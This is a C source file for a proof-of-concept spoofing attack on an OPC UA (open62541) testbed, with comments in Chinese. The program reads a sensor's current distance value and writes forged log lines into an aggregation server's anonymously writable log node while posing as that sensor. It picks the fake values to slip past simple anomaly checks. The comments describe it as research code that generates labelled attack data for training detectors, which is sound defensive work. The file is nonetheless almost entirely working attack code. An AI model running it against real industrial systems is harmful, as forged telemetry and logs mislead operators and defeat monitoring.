// =============================================================================
// STRIDE - S (Spoofing) 攻擊 PoC — **物理感知版**（第二階威脅模型）
// =============================================================================
// 與 spoof_attack.c 的唯一差別：注入假讀數之前，**先讀取目標 sensor 節點的當前
// 距離值**，再注入「當前值附近的一小步」，而不是量程內的均勻亂數。
//
// 為什麼需要這一版
// -----------------------------------------------------------------------------
// sensor_pub.c 改成受限隨機遊走後（值有慣性、相鄰讀數只差 ±STEP_MAX），
// spoof_attack.c 那種 uniform(2,50) 的注入會產生一個與前值相差很大的跳變，
// 單步 |Δ| 檢定的可分性上限就高達 AUC≈0.97 —— 太好抓，不足以支撐「偵測有難度」
// 的論點。真正現實的攻擊者會先觀察節點狀態再注入合理值。本程式就是那個攻擊者。
//
// 攻擊者的能力假設（都很現實，不需要特殊權限）
//   · 讀：sensor server @ (4841+id) 的 DistanceValue 節點是 READ 公開的，
//     任何匿名 client 都讀得到當前值。
//   · 寫：aggregation_server @4840 的 CentralLogIn 允許匿名寫入（同 spoof_attack.c）。
//
// 這一版**故意**留下的破綻（這才是偵測要抓的東西）
// -----------------------------------------------------------------------------
// 攻擊者能讓「自己注入的那一步」看起來完美（值就在當前值附近），但他**控制不了
// 下一步**：真感測器的下一筆是從**真值 x_t** 繼續遊走的，不是從假值 x' 繼續。
// 於是觀測序列 x_t → x'(假) → x_{t+1}(真) 的相鄰兩步呈**負相關**
// （step_i = a、step_{i+1} = w − a，Cov = −σ²），而正常隨機遊走的相鄰增量獨立。
// 這個二階統計結構在單步上看不見、需要至少兩步，實測可分性 AUC≈0.70 且與步長無關
// —— 正是序列模型該學、規則難寫的訊號。
//
// 用法： physics_aware_spoof [sensor_id>=1]
//   sensor_id 同時決定「讀哪個節點」(port 4841+id) 與「偽造內容自稱誰」(SourceName)。
//
// ⚠️ 僅用於你自己機器上、你自己系統的授權安全測試。
// =============================================================================
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <math.h>
#include <open62541/client_config_default.h>
#include <open62541/client_highlevel.h>

// ---- 可調參數 ----
#ifndef N_INJECT
#define N_INJECT        5      // 整段共注入幾筆假 log
#endif
#ifndef BASELINE_SEC
#define BASELINE_SEC    300    // 潛伏總時長（秒），與正常流量並行
#endif
#define DIST_MIN        2.0    // 量程下界（與 sensor_pub.c 一致）
#define DIST_MAX       50.0    // 量程上界
// 注入步長：取真感測器 STEP_MAX(1.5) 的一半，讓假值穩穩落在「合理的下一步」之內。
//   刻意比真步長保守 —— 攻擊者寧可注入更貼近當前值，也不要偶爾跳出合理範圍露餡。
#define INJECT_STEP     0.75
// 數值字面格式：必須與 sensor_pub.c / motor_sub.c 完全一致，否則「小數位數」
// 本身就成為可分特徵（見 sensor_pub.c/updateDistanceCallback 的說明）。
#define DIST_FMT        "%.15g"

static volatile UA_Boolean running = true;
static void stopHandler(int sig) { (void)sig; running = false; }

// 組出一行「與真實 customLogger 輸出格式完全相同」的 log 字串。
static void build_fake_log(char *out, size_t outlen, const char *level,
                           const char *cat, const char *msg) {
    UA_DateTimeStruct dts = UA_DateTime_toStruct(UA_DateTime_now());
    snprintf(out, outlen, "[%04u-%02u-%02u %02u:%02u:%02u.%03u (UTC)] %s/%s\t%s",
             dts.year, dts.month, dts.day, dts.hour, dts.min, dts.sec,
             dts.milliSec, level, cat, msg);
}

// 把一行 log 冒充寫進 aggregation_server 的 CentralLogIn。
static UA_StatusCode inject_log(UA_Client *client, const char *line) {
    UA_Variant v;
    UA_String s = UA_STRING((char *)line);
    UA_Variant_setScalar(&v, &s, &UA_TYPES[UA_TYPES_STRING]);
    return UA_Client_writeValueAttribute(client, UA_NODEID_STRING(1, "CentralLogIn"), &v);
}

// 讀取目標 sensor 節點的當前距離值。成功回傳 GOOD 並寫入 *out。
static UA_StatusCode read_current_distance(UA_Client *sensor, UA_Double *out) {
    UA_Variant v; UA_Variant_init(&v);
    UA_StatusCode rc = UA_Client_readValueAttribute(
        sensor, UA_NODEID_STRING(1, "DistanceValue"), &v);
    if (rc == UA_STATUSCODE_GOOD &&
        UA_Variant_hasScalarType(&v, &UA_TYPES[UA_TYPES_DOUBLE])) {
        *out = *(UA_Double *)v.data;
    } else if (rc == UA_STATUSCODE_GOOD) {
        rc = UA_STATUSCODE_BADTYPEMISMATCH;
    }
    UA_Variant_clear(&v);
    return rc;
}

int main(int argc, char **argv) {
    int sensor_id = 1;
    if (argc > 1) {
        sensor_id = atoi(argv[1]);
        if (sensor_id < 1) { fprintf(stderr, "用法: %s [sensor_id>=1]\n", argv[0]); return 2; }
    }
    char srcname[32];
    if (sensor_id == 1) snprintf(srcname, sizeof(srcname), "Sensor");
    else                snprintf(srcname, sizeof(srcname), "Sensor%d", sensor_id);

    char sensor_url[64];
    snprintf(sensor_url, sizeof(sensor_url), "opc.tcp://127.0.0.1:%d", 4841 + sensor_id);

    // 行緩衝：本程式常被上層腳本 kill -9 收尾，未 flush 的注入記錄會整段遺失
    // → 下游標不到 ground truth。行緩衝確保每筆注入即時落盤（同 spoof_attack.c）。
    setvbuf(stdout, NULL, _IOLBF, 0);
    signal(SIGINT, stopHandler);
    signal(SIGTERM, stopHandler);

    // 連線 1：aggregation_server（寫 CentralLogIn，注入用）
    UA_Client *agg = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(agg));
    printf("[PSPOOF] Connecting to aggregation_server@4840 (anonymous)...\n");
    if (UA_Client_connect(agg, "opc.tcp://127.0.0.1:4840") != UA_STATUSCODE_GOOD) {
        printf("[PSPOOF] agg connect failed\n"); UA_Client_delete(agg); return 1;
    }

    // 連線 2：目標 sensor server（讀 DistanceValue，偵察用）
    UA_Client *sensor = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(sensor));
    printf("[PSPOOF] Connecting to sensor@%s for reconnaissance...\n", sensor_url);
    UA_Boolean have_sensor =
        (UA_Client_connect(sensor, sensor_url) == UA_STATUSCODE_GOOD);
    if (!have_sensor)
        printf("[PSPOOF] sensor read unavailable — will fall back to last-known value.\n");

    printf("[PSPOOF] Lurking %d s, injecting %d physics-aware fake logs as %s...\n",
           BASELINE_SEC, N_INJECT, srcname);

    srand((unsigned)time(NULL) ^ 0xC0FFEE);

    // 隨機抽注入時點並排序（同 spoof_attack.c，避免週期性特徵）。
    int inject_at[N_INJECT];
    for (int i = 0; i < N_INJECT; i++) inject_at[i] = rand() % BASELINE_SEC;
    for (int i = 1; i < N_INJECT; i++) {
        int key = inject_at[i], j = i - 1;
        while (j >= 0 && inject_at[j] > key) { inject_at[j + 1] = inject_at[j]; j--; }
        inject_at[j + 1] = key;
    }

    // 讀不到節點時的保底：用量程中點當「最後已知值」，之後每次注入沿用上一次的假值
    // 繼續走一小步（仍是慣性的，只是少了真值校準 —— 破綻更大，屬於較弱的攻擊者）。
    UA_Double last_known = (DIST_MIN + DIST_MAX) / 2.0;

    time_t start = time(NULL);
    int next = 0;
    char line[1024];

    while (running) {
        int elapsed = (int)(time(NULL) - start);
        if (elapsed >= BASELINE_SEC) break;

        while (next < N_INJECT && inject_at[next] <= elapsed) {
            // ---- 偵察：讀當前真值 ----
            UA_Double base = last_known;
            if (have_sensor) {
                UA_Double cur;
                if (read_current_distance(sensor, &cur) == UA_STATUSCODE_GOOD) {
                    base = cur; last_known = cur;
                }
            }
            // ---- 注入：當前值 ± INJECT_STEP 的一小步（受量程反射約束）----
            double step = (((double)rand() / RAND_MAX) - 0.5) * 2.0 * INJECT_STEP;
            double fake_dist = base + step;
            while (fake_dist < DIST_MIN || fake_dist > DIST_MAX) {
                if (fake_dist < DIST_MIN) fake_dist = DIST_MIN + (DIST_MIN - fake_dist);
                if (fake_dist > DIST_MAX) fake_dist = DIST_MAX - (fake_dist - DIST_MAX);
            }
            last_known = fake_dist;   // 讀不到節點時，下次從這個假值繼續走

            char msg[256];
            snprintf(msg, sizeof(msg), "[Sensor] Updated distance: " DIST_FMT " cm", fake_dist);
            build_fake_log(line, sizeof(line), "info", "application", msg);
            size_t L = strlen(line);
            snprintf(line + L, sizeof(line) - L,
                     " | Severity=75 | SourceName=%s | EventType=application", srcname);
            inject_log(agg, line);
            printf("[PSPOOF] t=%ds base=%.3f injected(as %s): %s\n",
                   elapsed, base, srcname, line);
            next++;
        }

        UA_Client_run_iterate(agg, 0);
        usleep(200000);
    }

    printf("[PSPOOF] Done (%d/%d injected). Disconnecting.\n", next, N_INJECT);
    UA_Client_disconnect(agg);
    UA_Client_delete(agg);
    if (have_sensor) { UA_Client_disconnect(sensor); }
    UA_Client_delete(sensor);
    return 0;
}
